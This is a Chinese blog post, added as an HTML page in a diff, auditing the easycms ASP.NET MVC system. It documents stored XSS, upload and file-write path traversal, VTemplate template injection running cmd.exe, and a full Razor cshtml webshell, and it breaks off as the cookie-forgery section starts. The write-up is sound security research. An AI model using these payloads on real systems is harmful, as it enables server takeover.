@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.8.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>基于ASP.NET MVC的easycms的easy代码审计 - P1ay2win&#39;s blog</title>
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:site_name" content="P1ay2win's blog">
+<meta property="og:type" content="website">
+<meta property="og:title" content="基于ASP.NET MVC的easycms的easy代码审计 | P1ay2win's blog">
+<meta property="og:image" content="https://blog.play2win.top/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/">
+<meta property="twitter:image" content="https://blog.play2win.top/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/">
+
+
+
+
+
+
+
+
+<link rel="icon" href="/images/header.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/header.png" alt="基于ASP.NET MVC的easycms的easy代码审计" height="28">
+                P1ay2win&#39;s blog
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2021-07-09T14:51:53.000Z">2021-07-09</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/代码审计/">代码审计</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    23 分钟 读完 (大约 3469 个字)
+                </span>
+                
+                
+                    <i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span>次阅读
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                基于ASP.NET MVC的easycms的easy代码审计
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好久都没写博客了，做毕业设计的事、实习的事，还有其他事、各种事，也算是给我这个准备踏入社会的毛头小子上了一课，唉。最近一直有锻炼身体，感觉坚持学习的习惯也不能丢。两次实习的经历让我想搞搞代码审计和漏洞复现，在github上找了个一直有更新的ASP.NET MVC的cms审计一下，于是有了这篇文章。</p>
+<a id="more"></a>
+<h2 id="前期踩点"><a href="#前期踩点" class="headerlink" title="前期踩点"></a>前期踩点</h2><p>个人感觉白加黑的方式做代码审计更好，初略的看下这套系统的功能。前台看了下，除了查看栏目、查看文章和登录功能外并没有其他多余的功能。后台看了一圈，感觉文章管理、模板管理、站点设置、定时任务和个人中心这些功能存在漏洞的可能性比较大，需要重点审计这些功能。</p>
+<h2 id="后台存储型XSS"><a href="#后台存储型XSS" class="headerlink" title="后台存储型XSS"></a>后台存储型XSS</h2><h3 id="审计步骤"><a href="#审计步骤" class="headerlink" title="审计步骤"></a>审计步骤</h3><p>虽然后台的XSS没什么卵用，但借这个XSS试着跟踪下漏洞点，这时不知道为啥Visual Studio不能转到函数定义处，有点难顶。编辑文章这儿用的是ueditor，挖洞的时候经常挖他的XSS用来凑数。</p>
+<p><img src="/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/屏幕截图 2021-06-30 114019.png" alt></p>
+<p>点击保存文章请求会发送到<code>/Cms/Content/Save</code>这路由，代码在<code>Atlass.Framework.Web.Areas.Cms.Controllers</code>的<code>ContentController.cs</code>的87行开始，调用<code>SaveContent</code>方法保存文章内容。</p>
+<figure class="highlight c# hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-meta">RequirePermission(<span class="hljs-meta-string">"cms:content:add,cms:content:edit"</span>)</span>]</span><br><span class="line">[<span class="hljs-meta">HttpPost</span>]</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> IActionResult <span class="hljs-title">Save</span>(<span class="hljs-params">cms_content dto</span>)</span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">	_contentApp.SaveContent(dto, RequestHelper.AdminInfo());</span><br><span class="line">	...</span><br><span class="line">	<span class="hljs-keyword">return</span> Success(<span class="hljs-string">"保存成功"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>去到<code>Atlass.Framework.AppService.Cms</code>的<code>ContentAppService.cs</code>的75行，跟进SaveContent方法，文章内容没用经过任何处理，直接保存到了数据库中。</p>
+<figure class="highlight c# hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SaveContent</span>(<span class="hljs-params">cms_content dto, LoginUserDto loginUser</span>)</span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    dto.sub_title = dto.sub_title ?? <span class="hljs-string">""</span>;</span><br><span class="line">    ...</span><br><span class="line">    dto.update_time = DateTime.Now;</span><br><span class="line">    <span class="hljs-keyword">if</span> (dto.id == <span class="hljs-number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dto.dept_id = loginUser.DeptId;</span><br><span class="line">        dto.create_by = loginUser.LoginName;</span><br><span class="line">        dto.create_time = dto.update_time;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">long</span> contentId = Sqldb.Insert(dto).ExecuteIdentity();</span><br><span class="line">        ChannelManagerCache.SetChannelLink(dto.channel_id, (<span class="hljs-keyword">int</span>)contentId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Sqldb.Update&lt;cms_content&gt;().SetSource(dto).ExecuteAffrows();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来去看看显示文章的地方，在<code>Atlass.Framework.Web.Controllers.Cms</code>的另一个<code>ContentController</code>控制器的48行，调用<code>GenerateHtml</code>方法生成html并显示。<code>GenerateHtml</code>方法同时复杂首页、栏目和新闻的html生成，在<code>Atlass.Framework.Generate</code>的<code>GenerateService.cs</code>的71到73行<strong>原封不动地</strong>获取文章内容、栏目和<code>VTemplate</code>模板。</p>
+<figure class="highlight c# hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contentModel = generateApp.GetContentInfo(contentId);</span><br><span class="line">channelModel = generateApp.GetChannel(contentModel.channel_id);</span><br><span class="line">templateModel = ChannelManagerCache.GetContentTemplate(contentModel.channel_id);</span><br></pre></td></tr></table></figure>
+<p>任何在182行到185行将栏目和文章内容传到模板，并通过<code>VTemplate</code>的<code>GetRenderText</code>方法生成html。</p>
+<figure class="highlight c# hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">this</span>.Document.Variables.SetValue(<span class="hljs-string">"channel"</span>, channelModel);</span><br><span class="line"><span class="hljs-keyword">this</span>.Document.Variables.SetValue(<span class="hljs-string">"content"</span>, contentModel);</span><br><span class="line"><span class="hljs-comment">//渲染内容数据</span></span><br><span class="line"><span class="hljs-keyword">string</span> renderHtml = <span class="hljs-keyword">this</span>.Document.GetRenderText();</span><br></pre></td></tr></table></figure>
+<p>看看这个<code>VTemplate</code>模板，文章内容也是没有做任何处理直接显示到div标签里。于是乎XSS就产生了。</p>
+<p><img src="/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/屏幕截图 2021-06-30 155447.png" alt></p>
+<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>文章管理处随便写点内容并抓包，替换请求中<code>content</code>参数的内容为<code>&lt;script&gt;console.log(&quot;xss&quot;);&lt;/script&gt;</code>。</p>
+<p><img src="/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/屏幕截图 2021-06-30 160526.png" alt></p>
+<p>去到被修改的那篇文章处，打开控制台就能看到执行完js代码后输出的<code>xss</code>了。</p>
+<p><img src="/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/屏幕截图 2021-06-30 160804.png" alt="屏幕截图 2021-06-30 160804"></p>
+<p>其他一些地方可能也还存着XSS，但是后台的XSS意义不大，后续也没继续找了。</p>
+<h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><h3 id="审计步骤-1"><a href="#审计步骤-1" class="headerlink" title="审计步骤"></a>审计步骤</h3><p>上传文件的接口都在<code>BdUploadController</code>和<code>UploadController</code>这两个控制器里。先看看这个<code>BdUploadController</code>里的上传接口，属于自写ueditor后台的接口，无需身份验证，在前台就能访问。在78行到119行会根据传入的<code>action</code>参数对不同的文件上传类型进行白名单过滤，然而当<code>action</code>不是<code>uploadimage</code>、<code>uploadfile</code>或<code>uploadvideo</code>时就不会进入这三个<code>if</code>，当后续还是能保存文件，这三个白名单过滤就形同虚设了。</p>
+<figure class="highlight c# hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (action == <span class="hljs-string">"uploadimage"</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="hljs-keyword">var</span> imageExt = uploadSet.image_extname.Split(<span class="hljs-string">','</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> (!imageExt.Contains(extName))</span><br><span class="line">    &#123;</span><br><span class="line">        result.state = <span class="hljs-string">"FAIL"</span>;</span><br><span class="line">        result.error = <span class="hljs-string">$"禁止上传图片类型:<span class="hljs-subst">&#123;extName&#125;</span>"</span>;</span><br><span class="line">        <span class="hljs-keyword">return</span> Content(result.ToJson());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (action== <span class="hljs-string">"uploadfile"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(action==<span class="hljs-string">"uploadvideo"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>绕过白名单过滤后，上传的文件以随机字符串加上原文件后缀的方式保存。</p>
+<p><code>UploadController</code>里的上传图片和上传logo的接口也是存在任意文件上传的，但是文件名不可控，这里就不细说了。值得注意的是<code>SaveChunkFile</code>接口，也就是文章的上传附件功能，实现大文件分片上传的功能。在第233行当此次上传文件的大小大于给定<code>THUNK_SIZE</code>的时候，来到第263行，会从<code>chunk</code>参数中获取文件名，从<code>name</code>参数获取上传文件后缀，以此为新的文件名保存至临时文件夹中。这时就技能上传任意后缀文件，又能控制文件名。</p>
+<figure class="highlight c# hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">string</span> action = RequestHelper.GetPostString(<span class="hljs-string">"action"</span>);</span><br><span class="line"><span class="hljs-keyword">string</span> guid = RequestHelper.GetPostString(<span class="hljs-string">"guid"</span>);</span><br><span class="line"><span class="hljs-keyword">string</span> fileName = RequestHelper.GetPostString(<span class="hljs-string">"name"</span>);</span><br><span class="line"><span class="hljs-keyword">string</span> chunk= RequestHelper.GetPostString(<span class="hljs-string">"chunk"</span>);</span><br><span class="line"><span class="hljs-keyword">var</span> tempDir = GlobalParamsDto.WebRoot + <span class="hljs-string">"/UploadTemp/"</span>+ guid; <span class="hljs-comment">// 缓存文件夹</span></span><br><span class="line"><span class="hljs-keyword">var</span> targetDir = GlobalParamsDto.WebRoot+<span class="hljs-string">"/upfiles/videos/"</span>+DateTime.Now.ToString(<span class="hljs-string">"yyyyMMdd"</span>); </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> file = Request.Form.Files[<span class="hljs-number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">int</span> index = fileName.LastIndexOf(<span class="hljs-string">'.'</span>);</span><br><span class="line"><span class="hljs-keyword">string</span> extName = fileName.Substring(index);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//单文件小于分片大小的直接保存下来</span></span><br><span class="line"><span class="hljs-keyword">if</span> (file.Length &lt; THUNK_SIZE)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="hljs-keyword">return</span> Content(result.ToJson());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//添加分片id缓存</span></span><br><span class="line">FileChunkCache.AddChunkId(guid);</span><br><span class="line"><span class="hljs-comment">//大于分片大小的直接保存下来</span></span><br><span class="line"><span class="hljs-keyword">if</span> (!System.IO.Directory.Exists(tempDir))</span><br><span class="line">&#123;</span><br><span class="line">    System.IO.Directory.CreateDirectory(tempDir);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">string</span> filePath = tempDir+<span class="hljs-string">"/"</span>+ chunk.ToString()+ extName;</span><br><span class="line"><span class="hljs-comment">//file.SaveFile(filePath);</span></span><br><span class="line"><span class="hljs-keyword">using</span> (FileStream fs = System.IO.File.Create(filePath))</span><br><span class="line">&#123;</span><br><span class="line">    file.CopyTo(fs);</span><br><span class="line">    fs.Flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>试了下ueditor上传图片的接口，修改下<code>action</code>参数和上传文件名<code>filename</code>的后缀，试试上传html文件，成功返回了是上传文件路径。</p>
+<p><img src="/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/屏幕截图 2021-07-01 204533.png" alt></p>
+<p>并且上传的文件也能访问到。</p>
+<p><img src="/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/屏幕截图 2021-07-01 204713.png" alt></p>
+<p>再传个webshell看看，这时候访问上传文件就变成404了，把所有asp.net可以解析的文件都试了一遍结果还是一样。</p>
+<p><img src="/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/屏幕截图 2021-07-01 210337.png" alt></p>
+<p>这就很耐人寻味了，已经返回上传文件路径，而且代码层面没有对上传文件的后缀进行任何的过滤，但为什么就不能访问了呢。还好我借助谷歌师傅找到了答案。</p>
+<blockquote>
+<p>静态文件就是保存在磁盘文件系统上的 <code>JavaScript</code> 文件、图像图形、<code>CSS</code> 样式表文件等，ASP.NET Core 将这些静态文件视为资源，可以无需经过任何处理，直接作为响应返回给客户端。ASP.NET Core 中的静态文件一般存放在 <code>wwwroot</code> 目录下，如果不做额外的配置，那么 <code>wwwroot</code> 将会是我们应用程序中唯一可以存放静态文件的位置。</p>
+</blockquote>
+<p>也就是说在<code>wwwroot</code>目录<strong>只能解析常见的静态文件</strong>，这些动态脚本文件肯定是不能解析，甚至是不能访问的。文件名不可控，那这些任意文件上传的接口危害就有限了，顶多给你上传个html。</p>
+<p>好在还有一个文件分片传输的接口，控制文件名，上传并替换其中一个cshtml模板，利用Razor解析模板执行C#代码，就可以实现getshell了。将poc文件填充到5M，再上传文件并修改<code>chunk</code>为<code>../../../Views/Login/Index</code>。在写到这的前一刻，我还以为这样就能getshell，然而<strong>世事总是充满了遗憾</strong>，当我信心满满的打开登录界面，事实给了我当头一棒。cshtml模板太大，状态码直接就报500了。看来文件上传getshell的路子走不通。</p>
+<p><img src="/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/屏幕截图 2021-07-01 221805.png" alt></p>
+<h2 id="VTemplate模板注入"><a href="#VTemplate模板注入" class="headerlink" title="VTemplate模板注入"></a>VTemplate模板注入</h2><h3 id="审计步骤-2"><a href="#审计步骤-2" class="headerlink" title="审计步骤"></a>审计步骤</h3><p>在前面的XSS漏洞里已经知道，前台页面使用的VTemplate模板引擎来渲染的。模板管理功能可以直接修改这些模板。这个代码没什么好审计的，直接来漏洞利用。</p>
+<h3 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>VTemplate是一个很老的模板引擎，网上搜索了一下没有找到相关漏洞利用的文章，在看完开发文档后，发觉VTemplate是很强大的。利用<code>&lt;vt:serverdata&gt;</code>服务器数据标签元素获取请求阐述，<code>&lt;vt:function&gt;</code>函数调用标签元素调用函数，<code>{$}</code>变量元素输出变量内容基本就可以构造一个有回显的webshell。理论上理想情况下注入的内容是这样子的：</p>
+<figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">vt:serverdata</span> <span class="hljs-attr">var</span>=<span class="hljs-string">"cmd"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"QueryString"</span> <span class="hljs-attr">item</span>=<span class="hljs-string">"cmd"</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">vt:set</span> <span class="hljs-attr">var</span>=<span class="hljs-string">"cmd"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"$cmd"</span> <span class="hljs-attr">format</span>=<span class="hljs-string">"/c &#123;0&#125;"</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">vt:function</span> <span class="hljs-attr">var</span>=<span class="hljs-string">"process"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"Start"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"System.Diagnostics.Process"</span> <span class="hljs-attr">args</span>=<span class="hljs-string">"cmd.exe"</span> <span class="hljs-attr">args</span>=<span class="hljs-string">"$cmd"</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">vt:property</span> <span class="hljs-attr">var</span>=<span class="hljs-string">"streamReader "</span> <span class="hljs-attr">field</span>=<span class="hljs-string">"streamReader "</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"$process.StandardOutput"</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">vt:set</span> <span class="hljs-attr">var</span>=<span class="hljs-string">"result"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"$streamReader.ReadToEnd()"</span>/&gt;</span></span><br><span class="line">&#123;$result&#125;</span><br></pre></td></tr></table></figure>
+<p>但是在获取请求参数这步就不行了，试了获取当前请求实例的方法也是不行，输出执行结果也不行。只能找个折中的方法，单次执行一条命令，将执行结果重定向到文件中，再访问文件获取结果。留下不学无术的泪水T_T</p>
+<figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">vt:function</span> <span class="hljs-attr">var</span>=<span class="hljs-string">"path"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"GetFullPath"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"System.IO.Path"</span> <span class="hljs-attr">args</span>=<span class="hljs-string">"wwwroot"</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">vt:set</span> <span class="hljs-attr">var</span>=<span class="hljs-string">"path"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"$path"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"tmp.txt"</span> <span class="hljs-attr">format</span>=<span class="hljs-string">"&#123;0&#125;\&#123;1&#125;"</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">vt:set</span> <span class="hljs-attr">var</span>=<span class="hljs-string">"cmd"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"echo easycms_poc"</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">vt:set</span> <span class="hljs-attr">var</span>=<span class="hljs-string">"cmd"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"$cmd"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"$path"</span> <span class="hljs-attr">format</span>=<span class="hljs-string">"/c &#123;0&#125; &gt; &#123;1&#125;"</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">vt:function</span> <span class="hljs-attr">var</span>=<span class="hljs-string">"process"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"Start"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"System.Diagnostics.Process"</span> <span class="hljs-attr">args</span>=<span class="hljs-string">"cmd.exe"</span> <span class="hljs-attr">args</span>=<span class="hljs-string">"$cmd"</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">vt:output</span> <span class="hljs-attr">file</span>=<span class="hljs-string">"$path"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Bingo</strong></p>
+<p><img src="/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/屏幕截图 2021-07-02 104339.png" alt></p>
+<h2 id="任意文件写"><a href="#任意文件写" class="headerlink" title="任意文件写"></a>任意文件写</h2><h3 id="审计步骤-3"><a href="#审计步骤-3" class="headerlink" title="审计步骤"></a>审计步骤</h3><p>在<code>Atlass.Framework.Web.Areas.Cms.Controllers</code>的<code>TemplateCodeController.cs</code>的<code>Save</code>方法的第115行传入<code>template_mode</code>、<code>template_file</code>和<code>template_content</code>，调用<code>GenerateTemplate</code>的<code>Create</code>方法。跟进到<code>GenerateTemplate.cs</code>，不同的<code>template_mode</code>的值最终都是<code>FileUtils</code>工具类的<code>WriteText</code>方法写文件。传入的<code>template_file</code>和<code>template_content</code>可控，导致任意文件写。</p>
+<h3 id="漏洞验证-3"><a href="#漏洞验证-3" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>漏洞利用的思路也是跟任意文件上传一样，覆盖原来的cshtml模板，利用Razor解析模板执行C#代码。在源码里随便找个cshtml模板，这里以登录页面得模板为例，加上以下cshtml webshell内容。</p>
+<figure class="highlight c# hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">@<span class="hljs-keyword">using</span> System.Diagnostics;</span><br><span class="line">@<span class="hljs-keyword">using</span> System.IO;</span><br><span class="line">@functions &#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">string</span> <span class="hljs-title">ExecuteCommand</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> command</span>)</span></span><br><span class="line"><span class="hljs-function"></span>    &#123;</span><br><span class="line">        <span class="hljs-keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            ProcessStartInfo processStartInfo = <span class="hljs-keyword">new</span> ProcessStartInfo();</span><br><span class="line">            processStartInfo.FileName = <span class="hljs-string">"cmd.exe"</span>;</span><br><span class="line">            processStartInfo.Arguments = <span class="hljs-string">"/c "</span> + command;</span><br><span class="line">            processStartInfo.RedirectStandardOutput = <span class="hljs-literal">true</span>;</span><br><span class="line">            processStartInfo.UseShellExecute = <span class="hljs-literal">false</span>;</span><br><span class="line">            Process process = Process.Start(processStartInfo);</span><br><span class="line">            <span class="hljs-keyword">using</span> (StreamReader streamReader = process.StandardOutput)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="hljs-keyword">string</span> ret = streamReader.ReadToEnd();</span><br><span class="line">                <span class="hljs-keyword">return</span> ret;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> ex.ToString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@Html.Raw(ExecuteCommand(@Context.Request.Query[<span class="hljs-string">"test"</span>]))</span><br></pre></td></tr></table></figure>
+<p>然后在模板管理加个模板，模板文件就填<code>../../../Views/Login/Index.cshtml</code>，再保存模板就ok。</p>
+<p><img src="/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/屏幕截图 2021-07-02 163351.png" alt></p>
+<p>最后就能在登录页面执行命令了。</p>
+<p><img src="/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/屏幕截图 2021-07-02 164920.png" alt></p>
+<h2 id="任意用户cookie伪造"><a href="#任意用户cookie伪造" class="headerlink" title="任意用户cookie伪造"></a>任意用户cookie伪造</h2><h3 id="审计步骤-4"><a href="#审计步骤-4" class="headerlink" title="审计步骤"></a>审计步骤</h3><p>到目前为止，除了一个文件名不可靠的任意文件上传外，其他漏洞都是后台的漏洞，能getshell的漏洞也是只能登陆后才能利用。但是从一开始就看这个Cookie不顺眼了，长长一串的，刚开始还以为是jwt，然而并不是。</p>
+<p><img src="/2021/07/09/基于ASP.NET_MVC的easycms的easy代码审计/屏幕截图 2021-07-06 173517.png" alt></p>
+<p>去到<code>LoginController</code>的124和125行，将用户信息转为json并调用<code>RequestHelper</code>类的<code>SetCookie</code>方法。跟进到<code>SetCookie</code>方法，调用<code>Encrypt</code>类的<code>AesEncrypt</code>方法加密传进来的json，并设置为cookie。</p>
